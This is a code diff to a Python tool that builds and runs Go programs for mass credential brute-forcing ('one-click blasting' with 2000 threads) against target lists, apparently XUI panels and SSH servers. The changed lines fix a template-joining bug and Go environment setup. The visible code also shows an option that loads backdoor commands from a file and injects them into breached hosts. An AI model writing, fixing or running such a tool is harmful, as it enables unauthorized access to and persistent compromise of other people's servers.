@@ -1,5 +1,5 @@
 # -*- coding: utf-8 -*-
-# Final Optimized Version: High-Efficiency & Low Memory Usage
+# Final Version: Bugfix for NameError + Pre-processing + Max Speed
 import os
 import subprocess
 import time
@@ -16,13 +16,12 @@ except ImportError:
     pass # Will be handled by check_environment
 
 try:
-    import readline # For better input experience
+    import readline
 except ImportError:
     pass
 
 # =========================== Go Templates (Logic Part Only) ===========================
-# Each template now only contains the specific logic (imports, vars, processIP, helpers).
-# The high-performance main function will be dynamically added by the Python script.
+# The Go templates remain unchanged from the previous speed-optimized version.
 
 # Template 1: XUI
 XUI_GO_TEMPLATE_1 = '''
@@ -709,7 +708,12 @@ func main() {
 }
 '''
     logic_part = "package main\n" + template_content.split("package main")[1]
-    final_code = logic_part.split("import (")[0] + COMMON_LOGIC + strings.Join(logic_part.split("import (")[1:], "import (")
+    
+    # *** BUG FIX aPPLIED HERE ***
+    # Correctly split and join the Go code template
+    parts = logic_part.split("import (")
+    final_code = parts[0] + COMMON_LOGIC + "import (".join(parts[1:])
+
     final_code = final_code.replace("{semaphore_size}", str(semaphore_size)) \
                            .replace("{user_list}", to_go_string_array(usernames)) \
                            .replace("{pass_list}", to_go_string_array(passwords)) \
@@ -720,10 +724,20 @@ func main() {
         final_code = final_code.replace("{custom_backdoor_cmds}", to_go_string_array(kwargs.get("custom_cmds", [])))
     with open('xui.go', 'w', encoding='utf-8') as f: f.write(final_code)
 
+def get_go_env():
+    """Prepares a reliable environment for running Go commands."""
+    env = os.environ.copy()
+    go_bin_path = "/usr/local/go/bin"
+    if 'PATH' not in env or go_bin_path not in env['PATH']:
+        env['PATH'] = f"{go_bin_path}:{env.get('PATH', '')}"
+    env['GOCACHE'] = '/tmp/.cache/go-build'
+    env['GOPROXY'] = 'https://goproxy.cn,direct'
+    return env
+
 def compile_go_program():
     executable = "xui_executable" + (".exe" if sys.platform == "win32" else "")
     print("--- 正在编译Go程序... ---")
-    env = os.environ.copy(); env['GOCACHE'] = '/tmp/.cache/go-build'
+    env = get_go_env()
     try:
         subprocess.run([GO_EXEC, 'build', '-ldflags', '-s -w', '-o', executable, 'xui.go'], check=True, capture_output=True, text=True, encoding='utf-8', env=env)
         print(f"--- Go程序编译成功: {executable} ---")
@@ -735,7 +749,8 @@ def run_go_program(executable, input_file):
     print(f"--- 正在运行程序处理清洗后的文件: {input_file} ---")
     mem_limit = int(psutil.virtual_memory().total * 0.8 / 1024**2)
     print(f"设置Go内存限制为: {mem_limit}MiB")
-    env = os.environ.copy(); env["GOMEMLIMIT"] = f"{mem_limit}MiB"; env["GOGC"] = "50"
+    env = get_go_env()
+    env["GOMEMLIMIT"] = f"{mem_limit}MiB"; env["GOGC"] = "50"
     if sys.platform != "win32": os.chmod(executable, 0o755)
     cmd = ['./' + executable, input_file]
     if sys.platform == "linux": cmd = ["nice", "-n", "10"] + cmd
@@ -763,15 +778,17 @@ def check_environment(template_mode):
     try:
         subprocess.run(["apt-get", "update", "-y"], check=True, capture_output=True)
         subprocess.run(["apt-get", "install", "-y", "python3-pip", "python3-psutil", "curl", "tar"], check=True, capture_output=True)
-        if not os.path.exists(GO_EXEC) or b"go1.21" not in subprocess.check_output([GO_EXEC, "version"]):
+        go_env = get_go_env()
+        try:
+            subprocess.run([GO_EXEC, "version"], check=True, capture_output=True, env=go_env)
+        except (subprocess.CalledProcessError, FileNotFoundError):
             print("--- Go环境不满足，正在自动安装... ---")
             subprocess.run(["curl", "-#", "-Lo", "/tmp/go.tar.gz", "https://studygolang.com/dl/golang/go1.22.1.linux-amd64.tar.gz"], check=True)
             subprocess.run(["rm", "-rf", "/usr/local/go"], check=True)
             subprocess.run(["tar", "-C", "/usr/local", "-xzf", "/tmp/go.tar.gz"], check=True)
         if template_mode == 6:
             print("    - 正在安装SSH模块...")
-            env = os.environ.copy(); env['GOCACHE'] = '/tmp/.cache/go-build'
-            subprocess.run([GO_EXEC, "get", "golang.org/x/crypto/ssh"], check=True, capture_output=True, env=env)
+            subprocess.run([GO_EXEC, "get", "golang.org/x/crypto/ssh"], check=True, capture_output=True, env=go_env)
         print(">>> 环境依赖检测完成 ✅\n")
     except Exception as e:
         sys.exit(f"❌ 环境配置失败: {e}\n请检查apt源或网络后重试。")
@@ -807,8 +824,8 @@ if __name__ == "__main__":
             kwargs["install_backdoor"] = True
             with open("后门命令.txt", encoding='utf-8') as f: kwargs["custom_cmds"] = [l.strip() for l in f if l.strip()]
         print("\n=== 爆破一键启动 ===")
-        input_file = input_with_default("请输入源文件名", "1.txt")
-        cleaned_input_file = preprocess_list(input_file, "cleaned_targets.txt")
+        input_file = input_with_default("请输入源文件名", "1.txt") # Corrected function name
+        cleaned_input_file = preprocess_list(str(input_file), "cleaned_targets.txt")
         semaphore_size = input_with_default("爆破线程数", 2000)
         timeout = input_with_default("网络超时秒数", 8)
         usernames, passwords = load_credentials(TEMPLATE_MODE)
